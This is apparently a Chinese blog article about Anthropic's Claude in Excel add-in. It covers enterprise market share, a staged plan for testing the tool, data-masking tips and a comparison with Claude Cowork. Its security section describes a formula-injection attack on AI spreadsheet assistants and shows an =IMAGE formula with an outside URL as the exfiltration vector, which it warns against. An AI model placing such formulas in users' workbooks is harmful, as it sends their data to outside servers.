# Anthropic 推出 Claude in Excel，正在拉大与 OpenAI 在企业级应用的差距（附测评建议）

> 来源：微信公众号 Miss LN，2026-01-26
> 原文链接：https://mp.weixin.qq.com/s/g_E6igNr5m47pHsAK4cK9w

## 核心观点

Anthropic 通过 Claude in Excel 双重路径强势渗透 Excel，在企业级应用市场已斩获 32% 部署份额，超越 OpenAI 的 25%，**产品分发的广泛采用才是真正的护城河**。

---

## 背景：什么是 Claude in Excel？

周末，Claude 推出了全新的 Claude in Excel 功能，群里立刻有人迫不及待地进行了测试。很快，一张由 Claude in Excel 生成的复杂商业模型 excel 表出现在了群里，引得大家纷纷惊叹："Claude 功能已经这么强大了吗？"

![Claude in Excel 生成的复杂商业模型 excel 表](https://mmbiz.qpic.cn/mmbiz_jpg/gRaNO5Yiaz79MAcDDJpvgNVSQMPmlT1yEuIYmcEZPgXeLKNppXWevquP8mwiaIDX4rhCWTUeUuPdgJyohbp88wXg/640?wx_fmt=jpeg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=0)

Claude in Excel 是由 Anthropic 最新推出的一个插件/集成，可以把 Claude 这个大模型直接带入到 Excel 工作簿里，帮助用户理解复杂表格、定位公式错误、自动生成内容、测试假设，提升处理数据和模型的效率。它目前在 beta 阶段，在 Claude Pro、Max、Team 和 Enterprise 计划中提供。

![Claude in Excel 官方推文及 Excel 表格示例](https://mmbiz.qpic.cn/mmbiz_png/gRaNO5Yiaz79MAcDDJpvgNVSQMPmlT1yEHufz5MwHpsFCGrLRhYpBE8XkVxt5v2gCGLpXXibggLYL5RJTicEExOA/640?wx_fmt=png&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=1)

---

## Claude in Excel 能做什么

根据官方的指引（https://claude.com/claude-in-excel），Claude in excel 可以在下面的场景应用：

### 1. 解释复杂表格和公式逻辑

可以问任何关于单元格、公式或者整个工作簿的问题，Claude 会返回解释并且附带指向具体单元格的引用，方便你理解背后的逻辑。

### 2. 安全地更新假设和情景测试

你可以用自然语言告诉 Claude 改变某些输入（比如增长率、利率等），它会保持所有公式依赖关系，并根据你的要求在数据模型里做修改，同时标记所做的每一处更改并解释原因。

### 3. 调试和修复错误

Claude 能自动识别常见错误（像是 #REF!、#VALUE! 或循环引用等）并指出问题根源，还能提供修复建议。

### 4. 生成和填充模型/模板

基于你的需求，可以从零构建一个新模型或者填充现有模板，还能添加公式、计算逻辑等。

### 5. 跨工作表导航

它理解多选项卡表格结构，能够跨表格给出分析和解释。

### 6. 支持数据透视表和图表等功能

最新版本支持读取数据透视表、图表并处理文件上传，同时有快捷键快速启用。

### 7. 集成用户体验优化

支持拖拽多个文件、防止覆盖现有内容、长会话自动压缩上下文等增强功能。

---

## 产品的广泛采用（Distribution）是真正的护城河

Claude in Excel 发布后，圈内有很多评论，其中很火的一条评论来自产品专家 Aakash Gupta，他的评论最后一句话很形象：

> **The best model isn't the one with the highest scores. It's the one running inside Excel when the analyst builds their quarterly report.**

![产品分发的广泛采用是护城河](https://mmbiz.qpic.cn/mmbiz_png/gRaNO5Yiaz79MAcDDJpvgNVSQMPmlT1yEMPowCTrWdNQkZQ6OI8HibL94sEibTQicnhkbv9REfAb21qsVI88IEZuPw/640?wx_fmt=png&from=appmsg&watermark=1#imgIndex=2)

产品发布只是表象，一场分发渠道的"教科书级围猎"才是本质。

如今，Claude 正通过双重路径强势渗透 Excel：其一，是 Anthropic 官方推出的独立插件；其二，是深度嵌入微软 Copilot 的代理模式。这种合作极具戏剧性，尽管亚马逊（AWS）是微软在云服务领域的头号宿敌，微软仍不惜向其支付巨额费用，只为获取 Claude 的接口。

这种策略转向的背后，是微软残酷的内部测试结果：在处理 Excel 财务函数时，Claude 的逻辑表现彻底碾压了 OpenAI。甚至在 GitHub Copilot 中，一旦用户开启自动模型选择，开发者们如今已主要依赖 Claude Sonnet 4。

市场份额的变化最能说明问题，Anthropic 目前已斩获 32% 的企业级部署份额，而 OpenAI 则滑落至 25%。就在两周前，微软做出了一项影响深远的决策，将 Claude 设为全球 Microsoft 365 企业用户默认开启的 AI 选项。

Anthropic 成功洞察到了 OpenAI 的盲区，**企业对 AI 的采纳，核心驱动力在于分发渠道（Distribution），而非纸面上的跑分（Benchmarks）**。

而全球财富 500 强公司中，有 70% 本身就是微软 365 的客户。

最好的模型，未必是跑分最高的那个，而是当分析师在通宵赶制季度报表时正运行在 Excel 里的那一个。

---

## Claude in Excel 深度测评建议

如果你想对 Claude in Excel 进行一次深度且客观的测评，可以从逻辑深度、数据处理精度、交互体验以及安全性四个维度进行。

### 1. 准备不同难度的"考卷"

为了测出它的真实水平，你需要准备三类测试数据：

- **简单题（基础操作）**：一个包含数千行销售数据的基础表格，测试它清洗数据（查重、修正日期格式）和生成透视表的速度。
- **中等题（公式诊断）**：故意在一个嵌套了 3 层以上的 IF 或 VLOOKUP 公式中制造错误，看它能否准确指出错误单元格并给出修复建议。
- **难题（逻辑建模）**：提供一个多表联动的财务预测模型，要求它"将 2026 年的增长率下调 2% 并重新计算所有关联项"，测试其跨表理解能力。

### 2. 测评核心指标 (KPI)

在测试过程中，重点观察并记录以下表现：

| 维度 | 测评重点 |
|------|---------|
| **准确性** | 它修改的单元格是否正确？生成的公式是否符合 Excel 语法？ |
| **溯源能力** | 当它给出结论时，点击引用的单元格是否真的指向了正确的数据源？ |
| **响应速度** | 处理大批量数据（如 10 万行以上）时是否存在明显的延迟或崩溃？ |
| **自然语言理解** | 是否能听懂口语化的指令，还是必须使用死板的特定指令？ |

### 3. 进行对比测试 (A/B Test)

如果你想让测评更专业，可以引入对比：

- **VS 原生 Excel 工具**：对比 Claude 自动生成图表的速度与手动操作的速度。
- **VS Copilot for Excel**：如果你有 Microsoft 365 Copilot 的权限，可以对比两者的逻辑推理能力（Claude 通常在复杂逻辑解释上更占优）。

### 4. 压力测试：多文件关联

尝试拖入两个完全不同的 Excel 文件（例如：一份是"人力成本表"，一份是"项目进度表"），要求它：

**"根据这两份表，分析哪个项目的人力成本投入产出比最高？"**

这是目前 Claude in Excel 的一大卖点，看它能否在不打乱你原有表格结构的情况下完成复杂分析。

### 多文件关联压力测试指令

针对上面第四个多文件关联压力测试，为了测出 Claude in Excel 的真实上限，需要模拟跨领域、跨维度的复杂分析场景。

建议准备两个文件：

- **文件 A（人力成本表）**：包含员工姓名、所属项目、月薪、社保福利、加班费等。
- **文件 B（项目产出表）**：包含项目名称、当前进度（%）、交付质量得分、产生的合同金额或潜在收益。

我们可以分阶段，按难度由浅入深排列来测试：

#### 第一阶段：基础关联测试

**目的**：测试它能否准确识别两个文件中隐藏的共同字段（如：项目名称）。

**指令 1**：
> "请读取这两份文件。基于'项目名称'字段，帮我汇总每个项目的总人力成本（薪资+福利+加班费），并与该项目的'合同金额'并列显示。请以表格形式输出。"

**指令 2**：
> "检查这两份表中的项目名称是否有不匹配的情况（例如 A 表叫'AI研发'，B 表叫'人工智能开发项目'），如果存在模糊匹配，请列出来。"

#### 第二阶段：深度逻辑计算（核心测试）

**目的**：测试它处理复杂数学逻辑和非结构化分析的能力。

**指令 3（ROI 分析）**：
> "请计算每个项目的'人力成本产出比'（计算公式：产出金额 / 总人力成本）。考虑到部分项目还没结项，请将'产出金额'乘以'当前进度百分比'后再进行计算。最后告诉我在当前阶段，哪个项目表现最好，哪个最差？"

**指令 4（异常诊断）**：
> "分析这两份数据，是否存在某些项目投入了极高的人力成本，但项目进度却明显滞后（低于 30%）的情况？请列出这些异常项目并分析可能的原因。"

#### 第三阶段：模拟决策与"破坏性"压力测试

**目的**：测试它在不改变原表的情况下，进行场景推演的能力。

**指令 5（资源调配建议）**：
> "如果我需要从'产出比最低'的项目中抽调 2 名核心员工到'产出比最高'的项目中，根据 A 表的薪资水平，这能为我每月节省多少潜在的亏损？请直接给出计算过程。"

**指令 6（结构保护检查）**：
> "请根据以上分析结果，在我的'项目进度表'最右侧新增一列'建议调整方案'。注意：**不要修改我原来的任何单元格数据和公式**，只在空白区域提供建议。"

#### 在测评过程中，我们可以注意观察下面一些要点：

1. **观察引用的准确性**：当 Claude 说"项目 A 的成本是 50 万"时，仔细点击它提供的单元格引用链接。看它是否真的从 A 文件的正确列里抓取的数据，还是"幻觉"生成的数字。
2. **处理模糊名称**：故意在两份表里把项目名写得略有不同（比如加个空格，或者用简称），看它是否能智能识别它们是同一个项目。
3. **上下文窗口压力**：如果你的文件非常大（例如超过 10 万行），观察它的分析是否变慢，或者是否出现了"无法读取全量数据"的提示。
4. **多轮对话的一致性**：在问完第 5 个问题后，回过头问一个第 1 个问题的细节，看它是否还记得之前上传的文件内容。

**操作提示**：在 Excel 侧边栏中，通常可以直接点击"+"号或直接将文件图标拖入对话框来完成多文件上传。你可以先从两份简单的 Demo 文件开始尝试。

---

## 为了数据安全

当然在进行测评之前，如何安全使用清单至关重要。虽然 Claude in Excel 运行在隔离的沙箱（Sandbox）中，但作为用户，你输入的每一行数据都会被发送到云端进行推理。为了确保数据和隐私万无一失，请提前做一些准备。

### 1. 数据脱敏清单 (必做)

在将文件拖入 Excel 侧边栏之前，请对压力测试用的文件进行以下处理：

- **替换真实名称**：将员工姓名改为 Employee_001，客户名改为 Client_A。
- **数值模糊化**：如果不需要精确审计，可以将真实的薪资、合同金额整体乘以一个随机系数（如 0.85），或者四舍五入到万位。
- **删除敏感列**：彻底删除身份证号、银行卡号、手机号、家庭住址等与分析逻辑无关的字段。

### 2. 核心安全配置

在 Claude 界面中，请检查以下设置：

- **关闭"训练"选项**：进入 Claude 的 Settings → Privacy，确保关闭"Allow Anthropic to use my data to train models"（允许 Anthropic 使用我的数据训练模型）。
- **使用"隐身对话" (Incognito)**：如果你的测试包含极端敏感逻辑，可以使用隐身模式。该模式下，对话记录在 30 天后会从后台彻底清除。

### 3. 防范"公式注入"攻击 (高级风险)

这是一个 2026 年新发现的风险点（被称为 CellShock）：

- **不要运行未知来源的公式**：如果 Claude 建议你输入一个包含 URL 的公式（例如 `=IMAGE("https://external-link.com/...")`），请务必拒绝。攻击者可能通过这种方式将你表格里的数据作为 URL 参数发送到外部服务器。
- **仅信任本地逻辑**：要求 Claude 只生成标准的 Excel 函数（如 VLOOKUP, SUMIFS），不要生成任何尝试联网的自定义脚本。

### 4. 测评中的"假动作"测试

为了测试 Claude 是否会"偷看"不该看的数据，你可以在表格的某个角落放一个无关的、带有诱导性的标签（如：`Confidential_Password: Admin123`），然后在对话中问它：

> "请分析这份表的所有内容，告诉我你发现的最有价值的三个信息。"

观察看它是否会主动提起那个伪造的密码。如果它提到了，说明它的扫描范围可能比你想象的要大，你在后续使用中就需要更加严格地限制上传的内容。

### 总之，建议我们使用一个合理的安全测评策略来操作：

1. **第一步**：使用完全虚构的 Dummy Data（模拟数据）跑通逻辑。
2. **第二步**：使用脱敏后的业务数据进行压力测试。
3. **第三步**：在最终应用到真实核心账目之前，人工复核它生成的每一个关键公式。

---

## Claude in Excel VS Claude Cowork

两周之前，Claude 刚发布了 [Claude Cowork](https://mp.weixin.qq.com/s?__biz=Mzg3NTczNjIxNA==&mid=2247488031&idx=1&sn=2728d33552fca68484754d9b794f0042&scene=21#wechat_redirect)，也许有人会问两个工具有什么不同。

Claude in Excel 和 Claude Cowork，它们是 Anthropic 在 2026 年推出的工作自动化战略中的两个不同侧面，你可以把它们看作是垂直工具与通用代理的关系。

### 1. Claude in Excel：深耕表格的专业分析师

- **定位**：这是一个插件（Add-in）。它寄生在 Excel 内部，专门为处理电子表格而生。
- **核心能力**：它拥有对 Excel 单元格逻辑的原生访问权。它能看懂复杂的公式链，能帮你修 bug，能根据你的描述直接修改单元格数值。
- **特点**：极度专业，对财务模型、数据透视、跨表引用有深度优化。

### 2. Claude Cowork：横跨电脑的数字员工

- **定位**：这是一个自主代理（AI Agent）。它通常集成在 Claude 的桌面客户端中。
- **核心能力**：它具备"计算机使用"（Computer Use）能力。它可以通过你的鼠标和键盘操作，不仅限于 Excel，还能打开浏览器查资料、给同事发邮件、把 Excel 里的图表贴进 PPT 里。
- **特点**：通用性强，负责处理跨软件、多步骤的复杂工作流。

### 两者的区别对照表

| 维度 | Claude in Excel | Claude Cowork |
|------|----------------|---------------|
| **存在形式** | Excel 侧边栏插件 | 桌面应用/独立窗口 |
| **操作范围** | 仅限于当前的 Excel 工作簿 | 整个操作系统（浏览器、文件管理器等） |
| **交互方式** | 基于公式和表格数据的 API 调用 | 模拟人类操作（看屏幕、点图标、打字） |
| **适用场景** | 深度财务建模、审计公式、清洗千万行数据 | "帮我根据这份 Excel 里的数据，去官网查一下对应的汇率，然后写封邮件发给财务" |
| **底层模型** | 针对表格优化的 Sonnet / Opus | 具备 Computer Use 能力的特定版本 |

### 在实际工作中，它们往往是配合使用的

可以先用 Claude in Excel 在表格内部完成精细的数据整理和模型搭建。然后调用 Claude Cowork，**"把 Excel 刚才算出来的 Q4 盈利预测表截图，放进我的汇报幻灯片里，并发送给我的老板。"**

**总结一句话，Claude in Excel 是帮你把表做对；而 Claude Cowork 是帮你把活干完。**

---

## 继续阅读

- [2026：视频剪辑迎来 AI Agent 之年](https://mp.weixin.qq.com/s?__biz=Mzg3NTczNjIxNA==&mid=2247488071&idx=1&sn=7d79d2c977ed3f64de02bdcee1fee701&scene=21#wechat_redirect)
- [2025美国55家AI初创公司融资单轮破亿（附完整名单）](https://mp.weixin.qq.com/s?__biz=Mzg3NTczNjIxNA==&mid=2247488066&idx=1&sn=87fa7b3fe04733e1fe01f2810375a588&scene=21#wechat_redirect)
- [为何谨慎的 TSMC（台积电）提高 2026 年资本支出？](https://mp.weixin.qq.com/s?__biz=Mzg3NTczNjIxNA==&mid=2247488061&idx=1&sn=6f010d9e124545ea45513de1ec508ef3&scene=21#wechat_redirect)
- [OpenAI 投资 Altman 的脑机接口公司，一笔高度闭环的前沿押注？](https://mp.weixin.qq.com/s?__biz=Mzg3NTczNjIxNA==&mid=2247488049&idx=1&sn=b88f951aaa6cbed0a333f8e3daa94de7&scene=21#wechat_redirect)
- [法律初创公司 Harvey AI 发布 2025 年总结](https://mp.weixin.qq.com/s?__biz=Mzg3NTczNjIxNA==&mid=2247488043&idx=1&sn=dfec83c4a59c7fe20527944b112d30b3&scene=21#wechat_redirect)
- [把 Pitch Deck 交给 Claude Cowork ，会发生什么？](https://mp.weixin.qq.com/s?__biz=Mzg3NTczNjIxNA==&mid=2247488031&idx=1&sn=2728d33552fca68484754d9b794f0042&scene=21#wechat_redirect)
- [以光扩展规模：共封装光学（CPO）如何支撑下一代 AI 互连（三）](https://mp.weixin.qq.com/s?__biz=Mzg3NTczNjIxNA==&mid=2247488018&idx=1&sn=f43a22bc23b720e0878db6bc140958e1&scene=21#wechat_redirect)
- [以光扩展规模：共封装光学（CPO）如何支撑下一代 AI 互连（二）](https://mp.weixin.qq.com/s?__biz=Mzg3NTczNjIxNA==&mid=2247488007&idx=1&sn=3c8b60b1016a1f96e802180f898bebd2&scene=21#wechat_redirect)
- [以光扩展规模：共封装光学（CPO）如何支撑下一代 AI 互连（一）](https://mp.weixin.qq.com/s?__biz=Mzg3NTczNjIxNA==&mid=2247487998&idx=1&sn=4010bcbe2022d208cb067b580cf46c25&scene=21#wechat_redirect)

---

*作者提示: 个人观点，仅供参考*
